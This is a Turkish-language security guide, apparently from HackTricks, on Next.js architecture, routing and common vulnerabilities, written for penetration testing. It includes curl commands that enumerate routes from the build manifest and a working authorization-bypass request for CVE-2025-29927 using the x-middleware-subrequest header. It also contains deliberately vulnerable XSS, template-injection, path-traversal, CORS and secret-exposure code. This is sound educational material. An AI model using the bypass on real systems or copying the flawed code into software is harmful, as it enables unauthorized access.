# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Bir Next.js Uygulamasının Genel Mimarisi

### Tipik Dosya Yapısı

Standart bir Next.js projesi, yönlendirme, API endpoints ve statik varlık yönetimi gibi özelliklerini kolaylaştıran belirli bir dosya ve dizin yapısını takip eder. İşte tipik bir yapı:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Temel Diziler ve Dosyalar

- **public/:** Görseller, fontlar ve diğer statik varlıklar gibi statik dosyaları barındırır. Buradaki dosyalara kök yolundan (`/`) erişilebilir.
- **app/:** Uygulamanızın sayfaları, layoutları, bileşenleri ve API route’ları için merkezi dizin. **App Router** paradigmasını benimser; gelişmiş yönlendirme özellikleri ve sunucu-istemci bileşen ayrımı sağlar.
- **app/layout.tsx:** Uygulamanız için kök layout’u tanımlar; tüm sayfaları sarar ve header, footer ve navigasyon çubukları gibi tutarlı UI öğeleri sağlar.
- **app/page.tsx:** Kök route `/` için giriş noktası olarak hizmet eder ve ana sayfayı render eder.
- **app/[route]/page.tsx:** Statik ve dinamik route’ları yönetir. `app/` içindeki her klasör bir route segmentini temsil eder ve bu klasörlerdeki `page.tsx` ilgili route’un bileşenine karşılık gelir.
- **app/api/:** API route’larını içerir; HTTP isteklerini işleyen serverless fonksiyonlar oluşturmanıza olanak tanır. Bu route’lar geleneksel `pages/api` dizininin yerini alır.
- **app/components/:** Farklı sayfalar ve layoutlar arasında tekrar kullanılabilecek React bileşenlerini barındırır.
- **app/styles/:** Global CSS dosyalarını ve bileşen düzeyinde stil için CSS Module’larını içerir.
- **app/utils/:** Uygulama genelinde paylaşılabilecek yardımcı fonksiyonlar, yardımcı modüller ve diğer UI olmayan mantıkları içerir.
- **.env.local:** Lokal geliştirme ortamına özgü environment değişkenlerini depolar. Bu değişkenler versiyon kontrolüne **eklenmez**.
- **next.config.js:** Next.js davranışını özelleştirir; webpack yapılandırmaları, environment değişkenleri ve güvenlik ayarları dahil.
- **tsconfig.json:** Proje için TypeScript ayarlarını yapılandırır; type checking ve diğer TypeScript özelliklerini etkinleştirir.
- **package.json:** Proje bağımlılıklarını, scriptleri ve metadata’yı yönetir.
- **README.md:** Proje hakkında dokümantasyon ve bilgi sağlar; kurulum talimatları, kullanım yönergeleri ve diğer ilgili ayrıntıları içerir.
- **yarn.lock / package-lock.json:** Projenin bağımlılıklarını belirli sürümlere kilitler ve farklı ortamlarda tutarlı kurulumları garanti eder.

## Next.js İstemci Tarafı

### `app` Dizininin Dosya Tabanlı Routing’i

`app` dizini, en güncel Next.js sürümlerinde yönlendirmenin temelini oluşturur. Route’ları tanımlamak için dosya sisteminden faydalanır; bu da route yönetimini sezgisel ve ölçeklenebilir hale getirir.

<details>

<summary>Root Path / ile İlgilenme</summary>

**Dosya Yapısı:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Önemli Dosyalar:**

- **`app/page.tsx`**: Kök yol `/` için gelen istekleri işler.
- **`app/layout.tsx`**: Uygulama için düzeni tanımlar, tüm sayfaları kapsar.

**Uygulama:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Açıklama:**

- **Rota Tanımı:** `page.tsx` dosyası `app` dizininin hemen altında bulunur ve `/` rotasına karşılık gelir.
- **Rendering:** Bu bileşen ana sayfa için içeriği render eder.
- **Layout Integration:** `HomePage` bileşeni `layout.tsx` tarafından sarılır; bu dosya header, footer ve diğer ortak öğeleri içerebilir.

</details>

<details>

<summary>Diğer Statik Yolların Ele Alınması</summary>

**Örnek: `/about` Rotası**

**Dosya Yapısı:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Uygulama:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Açıklama:**

- **Rota Tanımı:** `about` klasörü içindeki `page.tsx` dosyası `/about` rotasına karşılık gelir.
- **Renderleme:** Bu bileşen about sayfasının içeriğini renderler.

</details>

<details>

<summary>Dinamik Rotalar</summary>

Dinamik rotalar, değişken segmentlere sahip yolların işlenmesine olanak tanır; uygulamaların ID'ler, slug'lar gibi parametrelere göre içerik göstermesini sağlar.

**Örnek: `/posts/[id]` Rota**

**Dosya Yapısı:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Uygulama:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Açıklama:**

- **Dinamik Segment:** `[id]` rota içindeki dinamik segmenti gösterir ve URL'den `id` parametresini yakalar.
- **Parametrelere Erişim:** `params` nesnesi dinamik parametreleri içerir ve component içinde erişilebilir.
- **Rota Eşleştirme:** `/posts/*` ile eşleşen herhangi bir yol, ör. `/posts/1`, `/posts/abc`, vb., bu component tarafından işlenir.

</details>

<details>

<summary>İç İçe Rotalar</summary>

Next.js iç içe rotalamayı destekler; dizin yapısını yansıtan hiyerarşik rota yapılarının oluşturulmasına olanak tanır.

**Örnek: `/dashboard/settings/profile` Rota**

**File Structure:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Uygulama:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Açıklama:**

- **Derin İç İçe:** `page.tsx` dosyası `dashboard/settings/profile/` içinde, `/dashboard/settings/profile` rotasına karşılık gelir.
- **Hiyerarşi Yansıması:** Dizin yapısı URL yolunu yansıtarak bakım kolaylığı ve açıklık sağlar.

</details>

<details>

<summary>Catch-All Rotaları</summary>

Catch-all rotaları, birden fazla iç içe geçmiş segmenti veya bilinmeyen yolları işler; rota yönetiminde esneklik sağlar.

**Örnek: `/*` Route**

**Dosya Yapısı:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Uygulama:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Açıklama:**

- **Catch-All Segment:** `[...slug]` kalan tüm yol segmentlerini bir dizi olarak yakalar.
- **Usage:** Kullanıcı tarafından oluşturulan yollar, iç içe kategoriler gibi dinamik yönlendirme senaryolarını işlemek için kullanışlıdır.
- **Route Matching:** `/anything/here`, `/foo/bar/baz` gibi yollar bu bileşen tarafından işlenir.

</details>

### Potansiyel İstemci Tarafı Zafiyetleri

Next.js güvenli bir temel sağlasa da, hatalı kodlama uygulamaları zafiyetler ortaya çıkarabilir. Önemli istemci tarafı zafiyetler şunlardır:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS saldırıları, kötü amaçlı scriptlerin güvenilen web sitelerine enjekte edilmesiyle oluşur. Saldırganlar kullanıcıların tarayıcılarında script çalıştırarak veri çalabilir veya kullanıcının adına işlemler gerçekleştirebilir.

**Güvenlik Açığı İçeren Kod Örneği:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Neden Zafiyetli:** `dangerouslySetInnerHTML`'i güvenilmeyen girdilerle kullanmak, saldırganların kötü amaçlı script enjekte etmesine izin verir.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Kullanıcı girdilerinin şablonlarda yanlış işlendiği durumlarda ortaya çıkar; saldırganların şablon veya ifadeleri enjekte edip çalıştırmasına izin verir.

**Zafiyetli Kod Örneği:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Neden Güvenli Değil:** Eğer `template` veya `data` kötü amaçlı içerik içeriyorsa, istenmeyen kodların çalıştırılmasına yol açabilir.

</details>

<details>

<summary>Client Path Traversal</summary>

Bu, saldırganların istemci tarafı yollarını manipüle ederek Cross-Site Request Forgery (CSRF) gibi istenmeyen eylemler gerçekleştirmesine izin veren bir zafiyettir. Sunucunun dosya sistemini hedef alan server-side path traversal'dan farklı olarak, CSPT meşru API isteklerini kötü niyetli endpoint'lere yönlendirmek için istemci tarafı mekanizmalarını istismar etmeye odaklanır.

**Zafiyetli Kod Örneği:**

Bir Next.js uygulaması kullanıcılara dosya yükleme ve indirme imkanı verir. İndirme özelliği istemci tarafında uygulanmıştır ve kullanıcılar indirilecek dosyanın dosya yolunu belirtebilir.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Saldırı Senaryosu

1. **Saldırganın Hedefi**: `filePath`'i değiştirerek kritik bir dosyayı (ör. `admin/config.json`) silmek için bir CSRF saldırısı gerçekleştirmek.
2. **CSPT'i İstismar Etme**:
- **Zararlı Girdi**: Saldırgan `../deleteFile/config.json` gibi değiştirilmiş bir `filePath` ile bir URL oluşturur.
- **Ortaya Çıkan API Çağrısı**: client-side kod `/api/files/../deleteFile/config.json` isteği yapar.
- **Sunucunun İşleyişi**: Eğer server `filePath`'i doğrulamazsa isteği işler; bu hassas dosyaların silinmesine veya açığa çıkmasına neden olabilir.
3. **CSRF'i Gerçekleştirme**:
- **Hazırlanan Link**: Saldırgan, hedefe değiştirilmiş `filePath` ile indirme isteğini tetikleyen bir link gönderir veya kötü amaçlı bir script gömer.
- **Sonuç**: Hedef farkında olmadan işlemi gerçekleştirir; bu yetkisiz dosya erişimi veya silinmeye yol açar.

#### Neden Zafiyetli

- **Girdi Doğrulama Eksikliği**: client-side rasgele `filePath` girdilerine izin verir, path traversal'a imkan tanır.
- **Client Girdilerine Güvenme**: server-side API `filePath`'i sanitizasyon yapmadan güvenir ve işler.
- **Potansiyel API Eylemleri**: Eğer API endpoint state-changing eylemler yapıyorsa (ör. dosyaları silme, değiştirme), CSPT üzerinden sömürülebilir.

</details>

### Keşif: _buildManifest ile static export rota keşfi

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Keşfedilen yolları (örneğin `/docs`, `/docs/content/examples`, `/signin`) auth testing ve endpoint discovery için kullanın.

## Next.js'de Sunucu Tarafı

### Sunucu Tarafı Rendering (SSR)

Sayfalar her istekte sunucuda render edilir ve kullanıcının tam olarak render edilmiş HTML almasını sağlar. Bu durumda istekleri işlemek için kendi özel sunucunuzu oluşturmalısınız.

**Kullanım Durumları:**

- Sık sık değişen dinamik içerik.
- SEO optimizasyonu, çünkü arama motorları tam render edilmiş sayfayı tarayabilir.

**Uygulama:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statik Site Oluşturma (SSG)

Sayfalar derleme zamanında önceden render edilir; bu, daha hızlı yükleme süreleri ve azalan sunucu yükü sağlar.

**Kullanım Durumları:**

- Sık değişmeyen içerik.
- Bloglar, dokümantasyon, pazarlama sayfaları.

**Uygulama:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverless Fonksiyonlar (API Routes)

Next.js, API uç noktalarının sunucusuz fonksiyonlar olarak oluşturulmasına olanak tanır. Bu fonksiyonlar, adanmış bir sunucuya ihtiyaç duymadan talep üzerine çalışır.

**Kullanım Durumları:**

- Form gönderimlerini işleme.
- Veritabanlarıyla etkileşim.
- Veri işleme veya üçüncü taraf API'lerle entegrasyon.

**Uygulama:**

`app` dizininin Next.js 13'te tanıtılmasıyla, yönlendirme ve API işlemleri daha esnek ve güçlü hale geldi. Bu modern yaklaşım dosya tabanlı yönlendirme sistemiyle yakından uyumlu olmakla birlikte, sunucu ve istemci bileşenleri desteği dahil olmak üzere geliştirilmiş yetenekler sunar.

#### Temel Rota İşleyicisi

**Dosya Yapısı:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Uygulama:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Açıklama:**

- **Konum:** API routes `app/api/` dizini altında yer alır.
- **Dosya Adlandırma:** Her API endpoint kendi klasöründe `route.js` veya `route.ts` dosyası barındırır.
- **Dışa Aktarılan Fonksiyonlar:** Tek bir default export yerine, belirli HTTP method fonksiyonları (ör. `GET`, `POST`) dışa aktarılır.
- **Response Yönetimi:** Yanıtları döndürmek için `Response` constructor'ını kullanın; bu, başlıklar ve durum kodları üzerinde daha fazla kontrol sağlar.

#### Diğer yollar ve HTTP yöntemleri nasıl ele alınır:

<details>

<summary>Belirli HTTP Yöntemlerini Ele Alma</summary>

Next.js 13+ aynı `route.js` veya `route.ts` dosyası içinde belirli HTTP yöntemleri için handler'lar tanımlamanıza izin verir; bu, daha açık ve düzenli kod sağlar.

**Örnek:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Açıklama:**

- **Multiple Exports:** Her HTTP yöntemi (`GET`, `PUT`, `DELETE`) kendi exported fonksiyonuna sahiptir.
- **Parameters:** İkinci argüman `params` aracılığıyla rota parametrelerine erişim sağlar.
- **Enhanced Responses:** Yanıt nesneleri üzerinde daha fazla kontrol sağlar; başlıklar ve durum kodlarının hassas yönetimine olanak tanır.

</details>

<details>

<summary>Catch-All ve Nested Rotalar</summary>

Next.js 13+ catch-all rotalar ve nested API rotaları gibi gelişmiş yönlendirme özelliklerini destekler; bu da daha dinamik ve ölçeklenebilir API yapıları oluşturmayı sağlar.

**Catch-All Rota Örneği:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Açıklama:**

- **Syntax:** `[...]` tüm iç içe geçmiş yolları yakalayan bir genel segmenti ifade eder.
- **Usage:** Farklı rota derinliklerini veya dinamik segmentleri işlemek zorunda olan API'ler için kullanışlıdır.

**İç İçe Rotalar Örneği:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Açıklama:**

- **Derin iç içe yapı:** Kaynak ilişkilerini yansıtan hiyerarşik API yapılarına olanak tanır.
- **Parametre Erişimi:** `params` nesnesi aracılığıyla birden fazla rota parametresine kolayca erişin.

</details>

<details>

<summary>Next.js 12 ve Öncesinde API route'larının Ele Alınması</summary>

## `pages` Dizinindeki API route'ları (Next.js 12 ve Öncesi)

Next.js 13 `app` dizinini ve gelişmiş yönlendirme yeteneklerini tanıtmadan önce, API route'ları öncelikle `pages` dizini içinde tanımlanıyordu. Bu yaklaşım hâlâ yaygın olarak kullanılır ve Next.js 12 ve önceki sürümlerde desteklenir.

#### Temel API route

**Dosya Yapısı:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Uygulama:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Açıklama:**

- **Konum:** API rotaları `pages/api/` dizini altında yer alır.
- **Dışa Aktarma:** Handler fonksiyonunu tanımlamak için `export default` kullanın.
- **Fonksiyon İmzası:** Handler, `req` (HTTP isteği) ve `res` (HTTP yanıtı) nesnelerini alır.
- **Yönlendirme:** Dosya adı (`hello.js`) `/api/hello` uç noktasına karşılık gelir.

#### Dinamik API Rotaları

**Dosya Yapısı:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Uygulama:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Açıklama:**

- **Dinamik Segmentler:** Köşeli parantezler (`[id].js`) dinamik rota segmentlerini belirtir.
- **Parametrelere Erişim:** Dinamik parametreye erişmek için `req.query.id` kullanın.
- **Metodları İşleme:** Farklı HTTP metodlarını (`GET`, `PUT`, `DELETE`, vb.) işlemek için koşullu mantık kullanın.

#### Farklı HTTP Metodlarını İşleme

Temel API rota örneği tüm HTTP metodlarını tek bir fonksiyon içinde ele alırken, kodunuzu her metodu açıkça işlemek üzere yapılandırabilirsiniz; bu, açıklık ve bakım kolaylığı sağlar.

**Örnek:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**En İyi Uygulamalar:**

- **Sorumlulukların Ayrılması:** Farklı HTTP yöntemleri için mantığı açıkça ayırın.
- **Yanıt Tutarlılığı:** İstemci tarafı işlemleri kolaylaştırmak için tutarlı yanıt yapıları sağlayın.
- **Hata Yönetimi:** Desteklenmeyen yöntemleri ve beklenmeyen hataları uygun şekilde ele alın.

</details>

### CORS Yapılandırması

API rotalarınıza hangi origin'lerin erişebileceğini kontrol ederek Cross-Origin Resource Sharing (CORS) zaafiyetlerini azaltın.

**Kötü Yapılandırma Örneği:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Unutmayın ki **CORS tüm API routes içinde de yapılandırılabilir**, ve bu **`middleware.ts`** dosyası içinde yapılır:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problem:**

- **`Access-Control-Allow-Origin: '*'`:** Herhangi bir web sitesinin API'ye erişmesine izin verir; bu durum kötü amaçlı sitelerin API'nizle kısıtlama olmadan etkileşime girmesine yol açabilir.
- **Tüm yöntemlere izin verilmesi:** Tüm yöntemlere izin vermek, saldırganların istenmeyen işlemler gerçekleştirmesine olanak sağlayabilir.

**Saldırganların bunu kötüye kullanma şekli:**

Saldırganlar, API'nize istek yapan kötü amaçlı web siteleri oluşturabilir ve böylece veri alma, veri değiştirme veya doğrulanmış kullanıcılar adına istenmeyen işlemleri tetikleme gibi işlevleri suistimal edebilirler.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Sunucu kodunun istemci tarafında açığa çıkması

Sunucu tarafından kullanılan kodun, istemci tarafında açığa çıkan ve kullanılan kodda da kolayca **kullanılabilmesi** mümkündür; bir kod dosyasının istemci tarafında asla ifşa olmamasını sağlamak için dosyanın başında bu import'u kullanmak en iyi yoldur:
```js
import "server-only"
```
## Temel Dosyalar ve Rolleri

### `middleware.ts` / `middleware.js`

**Konum:** Projenin kök dizini veya `src/` içinde.

**Amaç:** Bir istek işlenmeden önce server-side serverless function içinde kod çalıştırır; bu, authentication, redirects veya yanıtları değiştirme gibi görevleri yapmaya olanak tanır.

**Çalışma Akışı:**

1. **Gelen İstek:** Middleware isteği yakalar.
2. **İşleme:** İsteğe bağlı olarak işlemler gerçekleştirir (örn. authentication kontrolü).
3. **Yanıt Değişikliği:** Yanıtı değiştirebilir veya kontrolü bir sonraki handler'a verebilir.

**Örnek Kullanım Senaryoları:**

- Unauthenticated users yönlendirme.
- Custom headers ekleme.
- İstekleri logging.

**Örnek Konfigürasyon:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Eğer yetkilendirme middleware'de uygulanıyorsa, etkilenen Next.js sürümleri (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) `x-middleware-subrequest` header'ını enjekte ederek atlanabilir. Framework middleware recursion'u atlayıp korumalı sayfayı döndürecektir.

- Varsayılan davranış genellikle `/api/auth/signin` gibi bir giriş rotasına 307 yönlendirmesidir.
- Yanıtı 200'e çevirmek için uzun bir `x-middleware-subrequest` değeri gönderin (`middleware`i tekrar ederek `MAX_RECURSION_DEPTH`'e ulaşın):
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Kimliği doğrulanmış sayfalar birçok alt kaynak çektiği için, varlıkların yönlendirilmesini önlemek üzere başlığı her isteğe ekleyin (ör. Burp Match/Replace ile boş bir match string).

### `next.config.js`

**Location:** Projenin kökü.

**Purpose:** Next.js davranışını yapılandırır; özellikleri etkinleştirme/devre dışı bırakma, webpack yapılandırmalarını özelleştirme, ortam değişkenlerini ayarlama ve çeşitli güvenlik özelliklerini yapılandırma.

**Key Security Configurations:**

<details>

<summary>Güvenlik Başlıkları</summary>

Güvenlik başlıkları, tarayıcılara içeriği nasıl işleyeceklerini belirterek uygulamanızın güvenliğini artırır. Cross-Site Scripting (XSS), Clickjacking ve MIME type sniffing gibi çeşitli saldırıları hafifletmeye yardımcı olurlar:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Örnekler:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Görüntü Optimizasyonu Ayarları</summary>

Next.js görüntüleri performans için optimize eder, ancak yanlış yapılandırmalar güvenilmeyen kaynakların zararlı içerik enjekte etmesine izin vermek gibi güvenlik açıklarına yol açabilir.

**Kötü Yapılandırma Örneği:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Sorun:**

- **`'*'`:** Herhangi bir dış kaynaktan, güvenilmeyen veya kötü amaçlı domain'ler de dahil, resimlerin yüklenmesine izin verir. Saldırganlar kötü amaçlı payload içeren veya kullanıcıları yanıltan içerikler barındıran resimleri host edebilir.
- Başka bir sorun, **herkesin bir resim yükleyebildiği bir domain**e izin vermek olabilir (ör. `raw.githubusercontent.com`)

**Saldırganlar bunu nasıl kötüye kullanır:**

Kötü amaçlı kaynaklardan resimler enjekte ederek, saldırganlar phishing saldırıları gerçekleştirebilir, yanıltıcı bilgi gösterebilir veya görüntü işleme kütüphanelerindeki güvenlik açıklarından yararlanabilir.

</details>

<details>

<summary>Ortam Değişkenlerinin Açığa Çıkması</summary>

API anahtarları ve veritabanı kimlik bilgileri gibi hassas bilgileri istemciye açmadan güvenli şekilde yönetin.

#### a. Hassas Değişkenlerin Açığa Çıkması

**Kötü Yapılandırma Örneği:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Sorun:**

- **`SECRET_API_KEY`:** `NEXT_PUBLIC_` öneki olmadan, Next.js değişkenleri istemciye açmaz. Ancak yanlışlıkla önek eklendiğinde (ör. `NEXT_PUBLIC_SECRET_API_KEY`), istemci tarafında erişilebilir hale gelir.

**Saldırganlar bunu nasıl kötüye kullanır:**

Eğer hassas değişkenler istemciye açılırsa, saldırganlar istemci tarafı kodunu veya ağ isteklerini inceleyerek bunları elde edebilir ve API'lara, veritabanlarına veya diğer servislere yetkisiz erişim sağlayabilir.

</details>

<details>

<summary>Yönlendirmeler</summary>

Uygulama içinde URL yönlendirmelerini ve yeniden yazımları yönetin; kullanıcıların uygun şekilde yönlendirildiğinden emin olun ve open redirect vulnerabilities oluşturmamaya özen gösterin.

#### a. Open Redirect Vulnerability

**Kötü Yapılandırma Örneği:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Problem:**

- **Dinamik Destination:** Kullanıcıların herhangi bir URL belirtmesine izin verir; bu, open redirect saldırılarına olanak tanır.
- **Kullanıcı Girdilerine Güvenme:** Kullanıcılar tarafından sağlanan URL'lere doğrulama yapmadan yapılan yönlendirmeler phishing, malware dağıtımı veya kimlik bilgisi hırsızlığına yol açabilir.

**Saldırganlar bunu nasıl suistimal eder:**

Saldırganlar, alanınızdan geliyormuş gibi görünen ancak kullanıcıları kötü amaçlı sitelere yönlendiren URL'ler hazırlayabilir. Örneğin:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Orijinal alan adına güvenen kullanıcılar farkında olmadan zararlı web sitelerine yönlendirilebilir.

</details>

<details>

